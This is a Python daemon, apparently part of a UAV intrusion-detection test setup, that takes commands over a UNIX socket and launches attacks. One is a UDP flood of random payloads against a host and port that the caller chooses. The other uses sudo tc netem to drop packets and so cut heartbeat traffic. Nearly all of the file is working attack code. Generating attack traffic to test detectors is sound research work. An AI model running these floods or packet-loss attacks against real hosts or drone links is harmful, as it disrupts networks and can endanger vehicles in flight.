#!/usr/bin/env python3
"""
Background daemon that executes DoS floods or heartbeat-drop netem profiles.
Commands arrive via a UNIX domain socket (default: ~/.uav_ids/attackd.sock).
"""

from __future__ import annotations

import argparse
import json
import os
import pathlib
import socket
import threading
import time
from typing import Dict, List, Optional

import subprocess

ATTACK_LOG = pathlib.Path(os.environ.get("UAV_ATTACK_LOG", "~/.uav_ids/attackd.log")).expanduser()


class AttackTask(threading.Thread):
    def __init__(self, attack_id: str, duration: float) -> None:
        super().__init__(daemon=True)
        self.attack_id = attack_id
        self.duration = max(0.0, duration)
        self.stop_event = threading.Event()
        self.started_at = time.time()
        self.finished_at: Optional[float] = None
        self.status = "running"

    def stop(self) -> None:
        self.stop_event.set()

    def run(self) -> None:  # pragma: no cover - long-running task
        try:
            self._execute()
            self.status = "done"
        except Exception as exc:  # noqa: BLE001
            self.status = f"error: {exc}"
            log(f"[{self.attack_id}] error: {exc}")
        finally:
            self.finished_at = time.time()

    def _execute(self) -> None:
        raise NotImplementedError


class DosFloodTask(AttackTask):
    def __init__(self, attack_id: str, duration: float, payload_bytes: int, pps: float, host: str, port: int) -> None:
        super().__init__(attack_id, duration)
        self.payload_bytes = max(1, payload_bytes)
        self.pps = max(1.0, pps)
        self.host = host
        self.port = port

    def _execute(self) -> None:
        log(f"[{self.attack_id}] DoS flood -> {self.host}:{self.port} for {self.duration}s ({self.payload_bytes} B @ {self.pps} pps)")
        deadline = time.time() + self.duration
        payload = os.urandom(self.payload_bytes)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        interval = 1.0 / self.pps
        sent = 0
        while time.time() < deadline and not self.stop_event.is_set():
            sock.sendto(payload, (self.host, self.port))
            sent += 1
            time.sleep(interval)
        log(f"[{self.attack_id}] DoS complete, packets sent={sent}")


class HeartbeatDropTask(AttackTask):
    def __init__(self, attack_id: str, duration: float, loss: float, iface: str) -> None:
        super().__init__(attack_id, duration)
        self.loss_pct = max(0.0, min(loss * 100.0, 100.0))
        self.iface = iface

    def _execute(self) -> None:
        log(f"[{self.attack_id}] Heartbeat drop via tc netem loss {self.loss_pct:.1f}% on {self.iface} for {self.duration}s")
        add_cmd = ["sudo", "tc", "qdisc", "replace", "dev", self.iface, "root", "netem", f"loss", f"{self.loss_pct}%"]
        del_cmd = ["sudo", "tc", "qdisc", "del", "dev", self.iface, "root", "netem"]
        try:
            subprocess.run(add_cmd, check=True)
        except subprocess.CalledProcessError as exc:
            log(f"[{self.attack_id}] tc add failed: {exc}")
            return
        try:
            deadline = time.time() + self.duration
            while time.time() < deadline and not self.stop_event.is_set():
                time.sleep(0.2)
        finally:
            subprocess.run(del_cmd, check=False)
            log(f"[{self.attack_id}] tc netem cleared")


def log(message: str) -> None:
    ATTACK_LOG.parent.mkdir(parents=True, exist_ok=True)
    line = f"{time.strftime('%Y-%m-%d %H:%M:%S')} {message}"
    with ATTACK_LOG.open("a", encoding="utf-8") as handle:
        handle.write(line + "\n")
    print(line, flush=True)


class AttackServer:
    def __init__(self, socket_path: pathlib.Path) -> None:
        self.socket_path = socket_path
        if socket_path.exists():
            socket_path.unlink()
        socket_path.parent.mkdir(parents=True, exist_ok=True)
        self.tasks: Dict[str, AttackTask] = {}
        self.lock = threading.Lock()

    def serve_forever(self) -> None:
        with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as server:
            server.bind(str(self.socket_path))
            server.listen(5)
            log(f"[attackd] listening on {self.socket_path}")
            while True:
                conn, _ = server.accept()
                threading.Thread(target=self.handle_client, args=(conn,), daemon=True).start()

    def handle_client(self, conn: socket.socket) -> None:
        with conn:
            data = b""
            while not data.endswith(b"\n"):
                chunk = conn.recv(4096)
                if not chunk:
                    break
                data += chunk
            if not data:
                return
            try:
                req = json.loads(data.decode().strip())
            except json.JSONDecodeError as exc:
                conn.sendall(json.dumps({"error": str(exc)}).encode() + b"\n")
                return
            action = req.get("action")
            if action == "dos":
                reply = self.start_dos(req)
            elif action == "hb":
                reply = self.start_hb(req)
            elif action == "state":
                reply = self.state()
            elif action == "stop":
                reply = self.stop(req.get("attack_id"))
            elif action == "stop_all":
                reply = self.stop_all()
            else:
                reply = {"error": f"unknown action {action}"}
            conn.sendall(json.dumps(reply).encode() + b"\n")

    def start_dos(self, req: Dict[str, any]) -> Dict[str, any]:
        attack_id = f"dos-{int(time.time())}"
        task = DosFloodTask(
            attack_id=attack_id,
            duration=float(req.get("duration", 10)),
            payload_bytes=int(req.get("payload_bytes", 512)),
            pps=float(req.get("pps", 20)),
            host=req.get("host", "127.0.0.1"),
            port=int(req.get("port", 14640)),
        )
        self._register(task)
        return {"status": "scheduled", "attack_id": attack_id}

    def start_hb(self, req: Dict[str, any]) -> Dict[str, any]:
        attack_id = f"hb-{int(time.time())}"
        task = HeartbeatDropTask(
            attack_id=attack_id,
            duration=float(req.get("duration", 10)),
            loss=float(req.get("loss", 0.5)),
            iface=req.get("iface", "lo"),
        )
        self._register(task)
        return {"status": "scheduled", "attack_id": attack_id}

    def state(self) -> Dict[str, List[Dict[str, any]]]:
        with self.lock:
            info = [
                {
                    "attack_id": t.attack_id,
                    "status": t.status,
                    "started_at": t.started_at,
                    "finished_at": t.finished_at,
                    "duration": t.duration,
                }
                for t in self.tasks.values()
            ]
        return {"attacks": info}

    def stop(self, attack_id: Optional[str]) -> Dict[str, any]:
        if not attack_id:
            return {"error": "attack_id required"}
        with self.lock:
            task = self.tasks.get(attack_id)
        if not task:
            return {"error": f"{attack_id} not found"}
        task.stop()
        return {"status": "stopping", "attack_id": attack_id}

    def stop_all(self) -> Dict[str, any]:
        with self.lock:
            tasks = list(self.tasks.values())
        for task in tasks:
            task.stop()
        return {"status": "stopping", "count": len(tasks)}

    def _register(self, task: AttackTask) -> None:
        with self.lock:
            self.tasks[task.attack_id] = task
        task.start()


def main() -> None:
    parser = argparse.ArgumentParser(description="UAV attack daemon")
    parser.add_argument("--socket", default=os.path.expanduser("~/.uav_ids/attackd.sock"), help="UNIX socket path")
    args = parser.parse_args()
    server = AttackServer(pathlib.Path(args.socket))
    server.serve_forever()


if __name__ == "__main__":
    main()
